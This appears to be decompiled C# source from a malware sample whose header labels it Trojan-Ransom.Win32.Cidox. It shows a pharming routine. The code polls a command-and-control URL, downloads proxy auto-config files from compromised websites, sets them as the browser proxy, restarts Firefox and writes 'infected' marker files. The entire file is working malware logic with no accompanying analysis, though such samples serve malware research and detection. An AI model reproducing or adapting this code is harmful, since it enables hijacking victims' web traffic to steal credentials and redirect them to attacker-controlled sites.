// Decompiled with JetBrains decompiler
// Type: Pharming_v6.atproxy1
// Assembly: Pendencias, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4D4E4522-F191-4AA9-9B68-22EA4D196EE5
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Cidox.mgv-6279207241264840f782051166268af0f3e2a91bba87f5e854aca1f5d9198ea9.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Net;
using System.Threading;

namespace Pharming_v6
{
  [StandardModule]
  internal sealed class atproxy1
  {
    public static string pac;

    public static void atproxy1()
    {
      while (true)
      {
        string end;
        do
        {
          end = new StreamReader(((HttpWebResponse) ((HttpWebRequest) WebRequest.Create("http://nigel-payne.co.uk/includes/check.php")).GetResponse()).GetResponseStream()).ReadToEnd();
          if (Operators.CompareString(end, "avnao", false) == 0 & !System.IO.File.Exists(Module1.temp + "nuncafoiav.txt"))
          {
            if (!System.IO.File.Exists(Module1.temp + "txtmodificado.txt"))
            {
              writepac.writepac();
              Pharming_v6.atproxy1.pac = "file://" + Module1.temp + "temporaryfile.jsp";
              Module1.a(Pharming_v6.atproxy1.pac);
              killff.killff();
              firefox.firefox();
              Thread.Sleep(1000000);
            }
            else
            {
              Pharming_v6.atproxy1.pac = "file://" + Module1.temp + "temporaryfile.jsp";
              Module1.a(Pharming_v6.atproxy1.pac);
              killff.killff();
              firefox.firefox();
              Thread.Sleep(1000000);
            }
          }
          else if (Operators.CompareString(end, "avsim", false) == 0 & !System.IO.File.Exists(Module1.temp + "nuncafoiav.txt"))
          {
            string path = Module1.temp + "nuncafoiav.txt";
            try
            {
              if (!System.IO.File.Exists(path))
              {
                using (System.IO.File.Create(path))
                  ;
                using (StreamWriter streamWriter = new StreamWriter(path))
                  streamWriter.Write("infected");
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            string address = "http://photothequegaud.com/CATHEDRALES%20et%20AUTRES%20EGLISES/Autres%20eglises/41-SUISSE/41-GENE%20-%20Geneve%20-Auditoire%20Jean%20Calvin%20VIT/bu.jsp";
            try
            {
              new WebClient().DownloadFile(address, Module1.temp + "pacnet.jsp");
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            Module1.a("file://" + Module1.temp + "pacnet.jsp");
            killff.killff();
            firefox.firefox();
            Thread.Sleep(1000000);
          }
          else if (Operators.CompareString(end, "avnao", false) == 0 & System.IO.File.Exists(Module1.temp + "nuncafoiav.txt"))
          {
            System.IO.File.Delete(Module1.temp + "temporaryfile.jsp");
            System.IO.File.Move(Module1.temp + "pacnet.jsp", Module1.temp + "temporaryfile.jsp");
            System.IO.File.Delete(Module1.temp + "nuncafoiav.txt");
            string path = Module1.temp + "txtmodificado.txt";
            try
            {
              if (!System.IO.File.Exists(path))
              {
                using (System.IO.File.Create(path))
                  ;
                using (StreamWriter streamWriter = new StreamWriter(path))
                  streamWriter.Write("infected");
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            firefox.firefox();
            Thread.Sleep(1000000);
          }
        }
        while (!(Operators.CompareString(end, "avsim", false) == 0 & System.IO.File.Exists(Module1.temp + "nuncafoiav.txt")));
        string address1 = "http://www.interpraevent.at/tools/bu.jsp";
        try
        {
          new WebClient().DownloadFile(address1, Module1.temp + "pacnet.jsp");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        Module1.a("file://" + Module1.temp + "pacnet.jsp");
        killff.killff();
        firefox.firefox();
        Thread.Sleep(1000000);
      }
    }
  }
}
